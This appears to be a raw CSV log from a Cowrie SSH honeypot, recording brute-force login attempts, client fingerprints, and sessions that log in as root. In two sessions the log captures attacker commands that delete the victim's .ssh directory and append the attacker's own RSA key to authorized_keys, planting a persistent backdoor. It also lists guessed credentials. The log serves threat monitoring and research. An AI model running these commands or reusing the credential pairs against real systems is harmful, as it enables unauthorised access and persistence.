eventid,src_ip,src_port,dst_ip,dst_port,session,protocol,version,hassh,hasshAlgorithms,message,sensor,timestamp
cowrie.client.kex,206.189.175.87,,,,18d1358029ca,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T01:11:23.185326Z
cowrie.login.failed,206.189.175.87,,,,18d1358029ca,,,,,login attempt [nzb/nzb] failed,localhost,2024-11-29T01:11:23.260126Z
cowrie.session.closed,206.189.175.87,,,,18d1358029ca,,,,,Connection lost after 1 seconds,localhost,2024-11-29T01:11:24.270937Z
cowrie.session.connect,201.148.20.53,36328,172.233.154.19,2222,5db96eed40e6,ssh,,,,New connection: 201.148.20.53:36328 (172.233.154.19:2222) [session: 5db96eed40e6],localhost,2024-11-29T01:11:35.550830Z
cowrie.client.version,201.148.20.53,,,,5db96eed40e6,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-29T01:11:35.551415Z
cowrie.client.kex,201.148.20.53,,,,5db96eed40e6,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T01:11:35.612973Z
cowrie.login.failed,201.148.20.53,,,,5db96eed40e6,,,,,login attempt [aline/aline] failed,localhost,2024-11-29T01:11:35.899572Z
cowrie.session.closed,201.148.20.53,,,,5db96eed40e6,,,,,Connection lost after 1 seconds,localhost,2024-11-29T01:11:36.963179Z
cowrie.session.connect,138.68.106.58,35488,172.233.154.19,2222,3076c61b93ad,ssh,,,,New connection: 138.68.106.58:35488 (172.233.154.19:2222) [session: 3076c61b93ad],localhost,2024-11-29T01:11:40.610811Z
cowrie.client.version,138.68.106.58,,,,3076c61b93ad,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-29T01:11:40.612667Z
cowrie.client.kex,138.68.106.58,,,,3076c61b93ad,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T01:11:40.769819Z
cowrie.login.failed,138.68.106.58,,,,3076c61b93ad,,,,,login attempt [cortex/cortex] failed,localhost,2024-11-29T01:11:41.409529Z
cowrie.session.closed,138.68.106.58,,,,3076c61b93ad,,,,,Connection lost after 1 seconds,localhost,2024-11-29T01:11:42.570141Z
cowrie.session.connect,206.189.175.87,45852,172.233.154.19,2222,66142f230736,ssh,,,,New connection: 206.189.175.87:45852 (172.233.154.19:2222) [session: 66142f230736],localhost,2024-11-29T01:12:36.919974Z
cowrie.client.version,206.189.175.87,,,,66142f230736,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-29T01:12:36.920581Z
cowrie.client.kex,206.189.175.87,,,,66142f230736,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T01:12:36.928640Z
cowrie.login.failed,206.189.175.87,,,,66142f230736,,,,,login attempt [myy/myy] failed,localhost,2024-11-29T01:12:37.000944Z
cowrie.session.closed,206.189.175.87,,,,66142f230736,,,,,Connection lost after 1 seconds,localhost,2024-11-29T01:12:38.011287Z
cowrie.session.connect,138.68.106.58,49742,172.233.154.19,2222,707750822c2c,ssh,,,,New connection: 138.68.106.58:49742 (172.233.154.19:2222) [session: 707750822c2c],localhost,2024-11-29T01:12:49.495191Z
cowrie.client.version,138.68.106.58,,,,707750822c2c,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-29T01:12:49.495743Z
cowrie.client.kex,138.68.106.58,,,,707750822c2c,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T01:12:49.650278Z
cowrie.login.failed,138.68.106.58,,,,707750822c2c,,,,,login attempt [meg/meg] failed,localhost,2024-11-29T01:12:50.309576Z
cowrie.session.closed,138.68.106.58,,,,707750822c2c,,,,,Connection lost after 1 seconds,localhost,2024-11-29T01:12:51.466831Z
cowrie.session.connect,201.148.20.53,34096,172.233.154.19,2222,c3e43e601986,ssh,,,,New connection: 201.148.20.53:34096 (172.233.154.19:2222) [session: c3e43e601986],localhost,2024-11-29T01:12:54.693932Z
cowrie.client.version,201.148.20.53,,,,c3e43e601986,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-29T01:12:54.694457Z
cowrie.client.kex,201.148.20.53,,,,c3e43e601986,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T01:12:54.756557Z
cowrie.login.failed,201.148.20.53,,,,c3e43e601986,,,,,login attempt [mgc/mgc] failed,localhost,2024-11-29T01:12:55.045069Z
cowrie.session.closed,201.148.20.53,,,,c3e43e601986,,,,,Connection lost after 1 seconds,localhost,2024-11-29T01:12:56.109166Z
cowrie.session.connect,206.189.175.87,39718,172.233.154.19,2222,6ce862c7f608,ssh,,,,New connection: 206.189.175.87:39718 (172.233.154.19:2222) [session: 6ce862c7f608],localhost,2024-11-29T01:13:50.434957Z
cowrie.client.version,206.189.175.87,,,,6ce862c7f608,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-29T01:13:50.435546Z
cowrie.client.kex,206.189.175.87,,,,6ce862c7f608,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T01:13:50.443965Z
cowrie.login.failed,206.189.175.87,,,,6ce862c7f608,,,,,login attempt [carter/carter123] failed,localhost,2024-11-29T01:13:50.518617Z
cowrie.session.closed,206.189.175.87,,,,6ce862c7f608,,,,,Connection lost after 1 seconds,localhost,2024-11-29T01:13:51.532894Z
cowrie.session.connect,138.68.106.58,56166,172.233.154.19,2222,b81f5d4d5684,ssh,,,,New connection: 138.68.106.58:56166 (172.233.154.19:2222) [session: b81f5d4d5684],localhost,2024-11-29T01:13:59.736992Z
cowrie.client.version,138.68.106.58,,,,b81f5d4d5684,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-29T01:13:59.739429Z
cowrie.client.kex,138.68.106.58,,,,b81f5d4d5684,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T01:13:59.890104Z
cowrie.login.failed,138.68.106.58,,,,b81f5d4d5684,,,,,login attempt [shinyproxy/shinyproxy] failed,localhost,2024-11-29T01:14:00.500213Z
cowrie.session.closed,138.68.106.58,,,,b81f5d4d5684,,,,,Connection lost after 1 seconds,localhost,2024-11-29T01:14:01.664177Z
cowrie.session.connect,201.148.20.53,60092,172.233.154.19,2222,371343e4037a,ssh,,,,New connection: 201.148.20.53:60092 (172.233.154.19:2222) [session: 371343e4037a],localhost,2024-11-29T01:14:11.271844Z
cowrie.client.version,201.148.20.53,,,,371343e4037a,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-29T01:14:11.272368Z
cowrie.client.kex,201.148.20.53,,,,371343e4037a,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T01:14:11.335818Z
cowrie.login.failed,201.148.20.53,,,,371343e4037a,,,,,login attempt [ssg/ssg] failed,localhost,2024-11-29T01:14:11.630120Z
cowrie.session.closed,201.148.20.53,,,,371343e4037a,,,,,Connection lost after 1 seconds,localhost,2024-11-29T01:14:12.696216Z
cowrie.session.connect,206.189.175.87,36206,172.233.154.19,2222,be0e2ac3fb77,ssh,,,,New connection: 206.189.175.87:36206 (172.233.154.19:2222) [session: be0e2ac3fb77],localhost,2024-11-29T01:15:02.511091Z
cowrie.client.version,206.189.175.87,,,,be0e2ac3fb77,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-29T01:15:02.514142Z
cowrie.client.kex,206.189.175.87,,,,be0e2ac3fb77,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T01:15:02.523991Z
cowrie.login.failed,206.189.175.87,,,,be0e2ac3fb77,,,,,login attempt [will/password] failed,localhost,2024-11-29T01:15:02.599343Z
cowrie.session.closed,206.189.175.87,,,,be0e2ac3fb77,,,,,Connection lost after 1 seconds,localhost,2024-11-29T01:15:03.610214Z
cowrie.session.connect,138.68.106.58,56980,172.233.154.19,2222,34f369e91a1b,ssh,,,,New connection: 138.68.106.58:56980 (172.233.154.19:2222) [session: 34f369e91a1b],localhost,2024-11-29T01:15:09.965344Z
cowrie.client.version,138.68.106.58,,,,34f369e91a1b,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-29T01:15:09.967915Z
cowrie.client.kex,138.68.106.58,,,,34f369e91a1b,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T01:15:10.117012Z
cowrie.login.success,138.68.106.58,,,,34f369e91a1b,,,,,login attempt [root/123456aA@] succeeded,localhost,2024-11-29T01:15:10.724207Z
cowrie.session.params,138.68.106.58,,,,34f369e91a1b,,,,,[],localhost,2024-11-29T01:15:11.042355Z
cowrie.command.input,138.68.106.58,,,,34f369e91a1b,,,,,CMD: cd ~; chattr -ia .ssh; lockr -ia .ssh,localhost,2024-11-29T01:15:11.042897Z
cowrie.command.failed,138.68.106.58,,,,34f369e91a1b,,,,,Command not found: lockr -ia .ssh,localhost,2024-11-29T01:15:11.043731Z
cowrie.log.closed,138.68.106.58,,,,34f369e91a1b,,,,,Closing TTY Log: var/lib/cowrie/tty/c32b4937ce8564ea904a3bd2cb64805500ddfd28952a90fd55cb3c85d0be7644 after 0 seconds,localhost,2024-11-29T01:15:11.386654Z
cowrie.session.params,138.68.106.58,,,,34f369e91a1b,,,,,[],localhost,2024-11-29T01:15:11.565388Z
cowrie.command.input,138.68.106.58,,,,34f369e91a1b,,,,,"CMD: cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",localhost,2024-11-29T01:15:11.565733Z
cowrie.session.file_download,138.68.106.58,,,,34f369e91a1b,,,,,Saved redir contents with SHA-256 a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 to var/lib/cowrie/downloads/a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2,localhost,2024-11-29T01:15:11.719901Z
cowrie.log.closed,138.68.106.58,,,,34f369e91a1b,,,,,Closing TTY Log: var/lib/cowrie/tty/cc1eb03e9b5926d8076e25826664a04400de854bf5cc660fa35eb86cbdf7dc0f after 0 seconds,localhost,2024-11-29T01:15:11.720661Z
cowrie.session.connect,138.68.106.58,56992,172.233.154.19,2222,43807ccd6e8f,ssh,,,,New connection: 138.68.106.58:56992 (172.233.154.19:2222) [session: 43807ccd6e8f],localhost,2024-11-29T01:15:11.874069Z
cowrie.client.version,138.68.106.58,,,,43807ccd6e8f,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-29T01:15:11.874609Z
cowrie.client.kex,138.68.106.58,,,,43807ccd6e8f,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T01:15:12.028455Z
cowrie.login.failed,138.68.106.58,,,,43807ccd6e8f,,,,,login attempt [345gs5662d34/345gs5662d34] failed,localhost,2024-11-29T01:15:12.688724Z
cowrie.session.closed,138.68.106.58,,,,43807ccd6e8f,,,,,Connection lost after 1 seconds,localhost,2024-11-29T01:15:13.848688Z
cowrie.session.connect,138.68.106.58,49906,172.233.154.19,2222,9510beb754eb,ssh,,,,New connection: 138.68.106.58:49906 (172.233.154.19:2222) [session: 9510beb754eb],localhost,2024-11-29T01:15:13.995153Z
cowrie.client.version,138.68.106.58,,,,9510beb754eb,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-29T01:15:13.995771Z
cowrie.client.kex,138.68.106.58,,,,9510beb754eb,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T01:15:14.147341Z
cowrie.login.success,138.68.106.58,,,,9510beb754eb,,,,,login attempt [root/3245gs5662d34] succeeded,localhost,2024-11-29T01:15:14.780379Z
cowrie.session.closed,138.68.106.58,,,,34f369e91a1b,,,,,Connection lost after 4 seconds,localhost,2024-11-29T01:15:14.932406Z
cowrie.session.closed,138.68.106.58,,,,9510beb754eb,,,,,Connection lost after 0 seconds,localhost,2024-11-29T01:15:14.933083Z
cowrie.session.connect,201.148.20.53,57872,172.233.154.19,2222,b1b5915fd880,ssh,,,,New connection: 201.148.20.53:57872 (172.233.154.19:2222) [session: b1b5915fd880],localhost,2024-11-29T01:15:27.567201Z
cowrie.client.version,201.148.20.53,,,,b1b5915fd880,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-29T01:15:27.567807Z
cowrie.client.kex,201.148.20.53,,,,b1b5915fd880,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T01:15:27.631592Z
cowrie.login.success,201.148.20.53,,,,b1b5915fd880,,,,,login attempt [root/123456aA@] succeeded,localhost,2024-11-29T01:15:27.923581Z
cowrie.session.params,201.148.20.53,,,,b1b5915fd880,,,,,[],localhost,2024-11-29T01:15:28.069900Z
cowrie.command.input,201.148.20.53,,,,b1b5915fd880,,,,,CMD: cd ~; chattr -ia .ssh; lockr -ia .ssh,localhost,2024-11-29T01:15:28.070415Z
cowrie.command.failed,201.148.20.53,,,,b1b5915fd880,,,,,Command not found: lockr -ia .ssh,localhost,2024-11-29T01:15:28.071302Z
cowrie.log.closed,201.148.20.53,,,,b1b5915fd880,,,,,Closing TTY Log: var/lib/cowrie/tty/c32b4937ce8564ea904a3bd2cb64805500ddfd28952a90fd55cb3c85d0be7644 after 0 seconds,localhost,2024-11-29T01:15:28.239249Z
cowrie.session.params,201.148.20.53,,,,b1b5915fd880,,,,,[],localhost,2024-11-29T01:15:28.325494Z
cowrie.command.input,201.148.20.53,,,,b1b5915fd880,,,,,"CMD: cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",localhost,2024-11-29T01:15:28.326054Z
cowrie.session.file_download,201.148.20.53,,,,b1b5915fd880,,,,,Saved redir contents with SHA-256 a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 to var/lib/cowrie/downloads/a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2,localhost,2024-11-29T01:15:28.390752Z
cowrie.log.closed,201.148.20.53,,,,b1b5915fd880,,,,,Closing TTY Log: var/lib/cowrie/tty/cc1eb03e9b5926d8076e25826664a04400de854bf5cc660fa35eb86cbdf7dc0f after 0 seconds,localhost,2024-11-29T01:15:28.391232Z
